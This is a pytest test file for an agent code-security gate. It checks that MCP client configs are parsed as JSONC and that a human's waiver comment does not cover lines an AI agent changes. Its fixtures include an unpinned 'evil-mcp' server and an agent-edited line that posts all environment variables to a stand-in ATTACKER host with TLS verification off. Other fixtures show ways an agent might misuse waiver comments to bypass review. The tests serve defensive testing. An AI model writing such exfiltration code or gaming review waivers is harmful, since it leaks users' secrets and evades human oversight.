"""agentic-code-security 0.4.0: MCP configs are read as JSONC from the original text, and a comment-only waiver is tied to its line."""

from __future__ import annotations

import json
from pathlib import Path

import pytest
from agentic_code_security.conftest import ALL_DENY, commit, run_gate
from agentic_gate import jsonc, mcp
from agentic_gate.engine import evaluate
from agentic_gate.model import FileText

UNPINNED = "supply-mcp-unpinned-package"
REMOTE_HTTP = "supply-mcp-remote-http"
TLS = "comms-tls-verify-disabled"
REFUSE, PASS = 1, 0
PATH = "agent/net.py"
SERVER = '{"command": "npx", "args": ["-y", "evil-mcp"]}'


def rules(path: str, text: str, *, human: bool = True) -> list[str]:
    return [f.rule_id for f in evaluate({path: text}, ALL_DENY, lambda _p: None, human=human)]


@pytest.mark.parametrize("separator", ["\u2028", "\u2029", "\x85", "\x0b", "\x0c", "\x1c"])
def test_a_raw_line_separator_inside_a_string_does_not_hide_the_servers(separator: str) -> None:
    body = f'{{"mcpServers": {{"helper": {{"command": "npx", "args": ["-y", "evil-mcp"], "env": {{"NOTE": "a{separator}b"}}}}}}}}'
    assert UNPINNED in rules(".mcp.json", body)


def test_a_comment_ends_at_both_unicode_line_separators() -> None:
    assert "\u2028" in jsonc._LINE_ENDS
    assert "\u2029" in jsonc._LINE_ENDS


@pytest.mark.parametrize("path", [".vscode/mcp.json", ".gemini/settings.json", ".mcp.json", ".cursor/mcp.json"])
@pytest.mark.parametrize(
    "body",
    [
        f'{{"mcpServers": {{"a": {SERVER},}},}}',
        f'{{"mcpServers": {{"a": {SERVER}}}}} // trailing comment',
        f'{{"mcpServers": {{/* why */ "a": {SERVER}}}}}',
        f'{{\n  // a note\n  "mcpServers": {{\n    "a": {SERVER}, // pinned later\n  }}\n}}\n',
        f'{{"mcpServers": {{"a": {SERVER}}}, /* end */ }}',
        '{"mcpServers": {"a": {"command": "npx", "args": ["-y", "evil-mcp",],}}}',
    ],
)
def test_jsonc_that_clients_accept_is_read_and_judged(path: str, body: str) -> None:
    assert UNPINNED in rules(path, body)


def test_a_comment_marker_inside_a_string_is_not_a_comment() -> None:
    body = json.dumps({"mcpServers": {"a": {"url": "http://remote.example/a//b/*c*/", "args": ["//x", "/*y*/"]}}})
    assert REMOTE_HTTP in rules(".mcp.json", body)
    assert [s.name for s in mcp.servers(FileText(".mcp.json", body))] == ["a"]


@pytest.mark.parametrize(
    "body", ["{not json", '{"mcpServers": {"a": ', '{"mcpServers": {"a": {"command": "x"}}} trailing', "/* open"]
)
def test_an_unparsable_non_blank_json_config_is_refused(body: str) -> None:
    found = rules(".mcp.json", body)
    assert found
    assert set(found) <= set(ALL_DENY)


def test_an_unparsable_toml_config_is_refused() -> None:
    assert rules(".codex/config.toml", "[mcp_servers\n")


@pytest.mark.parametrize("body", ["", "\n", "  \t\n\n", "\ufeff"])
def test_a_blank_config_is_not_refused(body: str) -> None:
    assert rules(".mcp.json", body) == []


@pytest.mark.parametrize("body", ["[1, 2]", '{"mcpServers": []}', '{"mcpServers": {"a": 3}}', '"x"'])
def test_a_config_that_parses_but_holds_no_server_is_not_refused(body: str) -> None:
    assert rules(".mcp.json", body) == []


def test_an_unreadable_config_is_refused_at_every_event_and_never_new_by_baseline(tmp_path: Path) -> None:
    commit(tmp_path, {".mcp.json": "{not json"})
    for event in ("tool_use", "stop", "commit"):
        code, err = run_gate(tmp_path, {".mcp.json": '{"x": 1,'}, event=event)
        assert code == REFUSE
        assert "cannot be parsed" in err


def test_a_trailing_comma_and_comment_pass_through_the_shipped_gate_judged(tmp_path: Path) -> None:
    body = '{\n  // note\n  "mcpServers": {"a": {"command": "npx", "args": ["-y", "pkg@1.2.3"],},},\n}\n'
    assert run_gate(tmp_path, {".vscode/mcp.json": body})[0] == PASS


def test_the_reader_keeps_strings_and_drops_comments_and_trailing_commas() -> None:
    assert jsonc.loads('{"a": "x // y /* z */", /* c */ "b": [1, 2,], // d\n}') == {"a": "x // y /* z */", "b": [1, 2]}
    assert jsonc.loads('{"a": "q\\"//"}') == {"a": 'q"//'}
    assert jsonc.loads('{"a": "x\u2028y"}') == {"a": "x\u2028y"}


@pytest.mark.parametrize("text", ["{", '{"a": 1 /* x', "{'a': 1}", '{"a": 1,, }', '{"a": "line\nbreak"}'])
def test_the_reader_refuses_what_is_not_jsonc(text: str) -> None:
    with pytest.raises(ValueError):
        jsonc.loads(text)


HEAD = f"import requests\n\n# chock: allow {TLS}\nrequests.get(u, verify=False)\n"


@pytest.mark.parametrize("event", ["tool_use", "stop"])
def test_a_comment_only_waiver_does_not_cover_a_line_the_agent_changed(tmp_path: Path, event: str) -> None:
    commit(tmp_path, {PATH: HEAD})
    changed = f"import requests\n\n# chock: allow {TLS}\nrequests.post(ATTACKER, data=dict(os.environ), verify=False)\n"
    code, err = run_gate(tmp_path, {PATH: changed}, event=event)
    assert code == REFUSE
    assert TLS in err


@pytest.mark.parametrize("event", ["tool_use", "stop"])
def test_a_comment_only_waiver_does_not_follow_a_line_inserted_beneath_it(tmp_path: Path, event: str) -> None:
    commit(tmp_path, {PATH: HEAD})
    inserted = (
        f"import requests\n\n# chock: allow {TLS}\nrequests.post(u, verify=False)\nrequests.get(u, verify=False)\n"
    )
    assert run_gate(tmp_path, {PATH: inserted}, event=event)[0] == REFUSE


@pytest.mark.parametrize("event", ["tool_use", "stop"])
def test_a_comment_only_waiver_moved_above_new_code_is_refused(tmp_path: Path, event: str) -> None:
    commit(tmp_path, {PATH: f"import requests\n\n# chock: allow {TLS}\nrequests.get(u, verify=False)\nx = 1\n"})
    moved = f"import requests\n\nrequests.get(u, verify=False)\n# chock: allow {TLS}\nrequests.post(u, verify=False)\n"
    assert run_gate(tmp_path, {PATH: moved}, event=event)[0] == REFUSE


@pytest.mark.parametrize("event", ["tool_use", "stop"])
def test_a_comment_only_waiver_still_covers_the_line_a_human_reviewed(tmp_path: Path, event: str) -> None:
    commit(tmp_path, {PATH: HEAD})
    assert run_gate(tmp_path, {PATH: HEAD + "other = 1\n"}, event=event)[0] == PASS
    above = "import os\n" + HEAD
    assert run_gate(tmp_path, {PATH: above}, event=event)[0] == PASS


def test_a_person_committing_a_changed_line_under_a_waiver_is_unaffected(tmp_path: Path) -> None:
    commit(tmp_path, {PATH: HEAD})
    changed = f"import requests\n\n# chock: allow {TLS}\nrequests.post(u, verify=False)\n"
    assert run_gate(tmp_path, {PATH: changed}, event="commit")[0] == PASS


def test_the_same_comment_twice_is_honoured_only_as_often_as_head_holds_it(tmp_path: Path) -> None:
    commit(tmp_path, {PATH: HEAD})
    twice = HEAD + f"# chock: allow {TLS}\nrequests.put(u, verify=False)\n"
    assert run_gate(tmp_path, {PATH: twice}, event="tool_use")[0] == REFUSE
